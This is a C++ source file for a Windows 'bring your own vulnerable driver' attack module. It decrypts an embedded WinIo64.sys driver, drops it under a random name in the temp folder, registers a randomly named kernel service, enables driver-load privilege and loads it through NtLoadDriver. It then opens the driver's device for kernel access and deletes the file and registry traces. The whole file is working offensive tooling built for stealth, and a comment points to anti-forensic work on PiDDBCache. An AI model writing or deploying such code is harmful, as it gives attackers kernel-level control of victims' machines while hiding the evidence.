// _CRT_RAND_S must be set before ANY CRT header is pulled in (including via
// windows.h transitively), so define it first.
#define _CRT_RAND_S
#include <stdlib.h>

#include "byovd.h"
#include "crypto.h"
#include "ntapi.h"

#include <cstdio>
#include <cstring>

namespace {

bool random_name(wchar_t* out, size_t len) {
    static const wchar_t alphabet[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    constexpr size_t n = (sizeof(alphabet) / sizeof(wchar_t)) - 1;

    for (size_t i = 0; i < len; ++i) {
        unsigned int r;
        if (rand_s(&r) != 0) return false;
        out[i] = alphabet[r % n];
    }
    out[len] = L'\0';
    return true;
}

bool write_file_bytes(const std::wstring& path, const void* data, size_t size) {
    HANDLE h = CreateFileW(
        path.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    DWORD wrote = 0;
    BOOL ok = WriteFile(h, data, static_cast<DWORD>(size), &wrote, nullptr);
    CloseHandle(h);
    return ok && wrote == size;
}

bool write_reg_dword(HKEY key, const wchar_t* name, DWORD value) {
    return RegSetValueExW(key, name, 0, REG_DWORD,
                          reinterpret_cast<const BYTE*>(&value),
                          sizeof(value)) == ERROR_SUCCESS;
}

bool write_reg_expand_sz(HKEY key, const wchar_t* name, const std::wstring& value) {
    return RegSetValueExW(key, name, 0, REG_EXPAND_SZ,
                          reinterpret_cast<const BYTE*>(value.c_str()),
                          static_cast<DWORD>((value.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS;
}

} // namespace

namespace byovd {

bool decrypt_and_drop(const std::vector<uint8_t>& encrypted_blob, Context& ctx) {
    // Copy into a mutable buffer and decrypt in-place.
    std::vector<uint8_t> plain = encrypted_blob;
    crypto::rolling_xor(plain.data(), plain.size());

    // Sanity check: should be a valid PE (MZ + PE signatures).
    if (plain.size() < 0x40 || plain[0] != 'M' || plain[1] != 'Z') {
        std::printf("[!] byovd: MZ signature missing after decrypt\n");
        return false;
    }
    const uint32_t pe_off = *reinterpret_cast<uint32_t*>(&plain[0x3C]);
    if (pe_off + 4 > plain.size() ||
        plain[pe_off] != 'P' || plain[pe_off + 1] != 'E') {
        std::printf("[!] byovd: PE signature missing after decrypt\n");
        return false;
    }

    // PE COFF TimeDateStamp — needed as forensic match key for PiDDBCache.
    // Layout: PE signature (4B) + IMAGE_FILE_HEADER.TimeDateStamp at offset +4.
    if (pe_off + 8 + 4 > plain.size()) return false;
    ctx.timestamp = *reinterpret_cast<const uint32_t*>(&plain[pe_off + 4 + 4]);

    // Build %TEMP%\<6random> with no extension.
    wchar_t temp_dir[MAX_PATH];
    DWORD n = GetTempPathW(MAX_PATH, temp_dir);
    if (!n || n > MAX_PATH) return false;

    wchar_t rand[7];
    if (!random_name(rand, 6)) return false;

    ctx.basename  = rand;
    ctx.file_path = std::wstring(temp_dir) + rand;

    if (!write_file_bytes(ctx.file_path, plain.data(), plain.size())) {
        std::printf("[!] byovd: write temp file failed (%lu)\n", GetLastError());
        return false;
    }

    std::wprintf(L"[+] byovd: dropped to %ls (%zu bytes, no extension, "
                 L"TimeDateStamp=0x%08X)\n",
                 ctx.file_path.c_str(), plain.size(), ctx.timestamp);
    return true;
}

bool load_service(Context& ctx) {
    // 1. Generate 8-char random service name.
    wchar_t svc[9];
    if (!random_name(svc, 8)) return false;
    ctx.service_name = svc;

    std::wstring reg_key = L"System\\CurrentControlSet\\Services\\" + ctx.service_name;
    ctx.service_registry_path =
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + ctx.service_name;

    // 2. Create registry subkey under HKLM.
    HKEY key = nullptr;
    LSTATUS ls = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, reg_key.c_str(), 0, nullptr, 0,
        KEY_WRITE, nullptr, &key, nullptr);
    if (ls != ERROR_SUCCESS) {
        std::printf("[!] byovd: RegCreateKeyExW failed %ld\n", ls);
        return false;
    }

    // 3. Populate values.
    //   Type        = 1 (SERVICE_KERNEL_DRIVER)
    //   Start       = 3 (SERVICE_DEMAND_START)
    //   ErrorControl= 1 (SERVICE_ERROR_NORMAL)
    //   ImagePath   = \??\<full_temp_path>
    std::wstring image_path = L"\\??\\" + ctx.file_path;

    bool ok =
        write_reg_dword(key, L"Type", 1) &&
        write_reg_dword(key, L"Start", 3) &&
        write_reg_dword(key, L"ErrorControl", 1) &&
        write_reg_expand_sz(key, L"ImagePath", image_path);

    RegCloseKey(key);
    if (!ok) {
        std::printf("[!] byovd: failed to write service registry values\n");
        return false;
    }

    // 4. Enable SE_LOAD_DRIVER_PRIVILEGE.
    BOOLEAN prev = FALSE;
    NTSTATUS st = ntapi::RtlAdjustPrivilege(
        SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &prev);
    if (!NT_SUCCESS(st)) {
        std::printf("[!] byovd: RtlAdjustPrivilege failed 0x%08lX (need admin)\n",
                    static_cast<unsigned long>(st));
        return false;
    }

    // 5. NtLoadDriver on the registry path.
    UNICODE_STRING us{};
    ntapi::RtlInitUnicodeString(&us, ctx.service_registry_path.c_str());
    st = ntapi::NtLoadDriver(&us);

    if (NT_SUCCESS(st) || st == STATUS_IMAGE_ALREADY_LOADED) {
        ctx.loaded = true;
        std::wprintf(L"[+] byovd: NtLoadDriver ok (service=%ls, status=0x%08lX)\n",
                     ctx.service_name.c_str(), static_cast<unsigned long>(st));
        return true;
    }

    std::printf("[!] byovd: NtLoadDriver failed 0x%08lX\n",
                static_cast<unsigned long>(st));
    return false;
}

bool open_device(Context& ctx) {
    // WinIo64.sys hardcodes \Device\WinIo regardless of service name
    const wchar_t* dev_path = L"\\\\.\\WinIo";

    ctx.device = CreateFileW(
        dev_path,
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (ctx.device == INVALID_HANDLE_VALUE) {
        std::wprintf(L"[!] byovd: CreateFileW(%ls) failed %lu\n",
                     dev_path, GetLastError());
        return false;
    }
    std::wprintf(L"[+] byovd: opened device handle (%ls)\n", dev_path);
    return true;
}

bool unload(Context& ctx) {
    bool all_ok = true;

    if (ctx.device != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx.device);
        ctx.device = INVALID_HANDLE_VALUE;
    }

    if (ctx.loaded) {
        UNICODE_STRING us{};
        ntapi::RtlInitUnicodeString(&us, ctx.service_registry_path.c_str());
        NTSTATUS st = ntapi::NtUnloadDriver(&us);
        if (!NT_SUCCESS(st)) {
            std::printf("[!] byovd: NtUnloadDriver failed 0x%08lX\n",
                        static_cast<unsigned long>(st));
            all_ok = false;
        }
        ctx.loaded = false;
    }

    if (!ctx.file_path.empty()) {
        if (!DeleteFileW(ctx.file_path.c_str())) {
            // File may already be gone (first-load race). Not fatal.
        }
    }

    if (!ctx.service_name.empty()) {
        std::wstring reg_key = L"System\\CurrentControlSet\\Services\\" + ctx.service_name;
        LSTATUS ls = RegDeleteTreeW(HKEY_LOCAL_MACHINE, reg_key.c_str());
        if (ls != ERROR_SUCCESS && ls != ERROR_FILE_NOT_FOUND) {
            std::printf("[!] byovd: RegDeleteTreeW failed %ld\n", ls);
            all_ok = false;
        }
    }

    std::printf("[+] byovd: unload %s\n", all_ok ? "clean" : "with warnings");
    return all_ok;
}

} // namespace byovd
